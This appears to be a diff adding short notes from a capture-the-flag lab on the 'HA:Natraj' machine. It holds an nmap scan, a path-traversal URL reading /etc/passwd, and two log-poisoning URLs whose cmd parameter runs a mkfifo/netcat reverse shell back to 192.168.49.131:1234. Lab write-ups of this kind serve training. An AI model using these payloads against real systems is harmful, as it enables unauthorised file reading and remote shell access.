@@ -1,0 +1,27 @@
+kali@kali:~$ nmap -A -p- 192.168.51.80
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-20 07:38 EDT
+Nmap scan report for 192.168.51.80
+Host is up (0.00012s latency).
+Not shown: 65533 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 d9:9f:da:f4:2e:67:01:92:d5:da:7f:70:d0:06:b3:92 (RSA)
+|   256 bc:ea:f1:3b:fa:7c:05:0c:92:95:92:e9:e7:d2:07:71 (ECDSA)
+|_  256 f0:24:5b:7a:3b:d6:b7:94:c4:4b:fe:57:21:f8:00:61 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: HA:Natraj
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+Dirbuser 
+/console/file.php --> suspicious
+penetrate the php file
+
+http://192.168.131.80/console/file.php?file=files/../../../../../../../../etc/passwd
+
+http://192.168.131.80/console/file.php?file=/var/log/auth.log&cmd=rm /tmp/f; mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1|nc 192.168.49.131 1234 >/tmp/f 
+
+
+http://192.168.131.80/console/file.php?file=/var/log/auth.log&cmd=mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1|nc 192.168.49.131 1234 >/tmp/f 
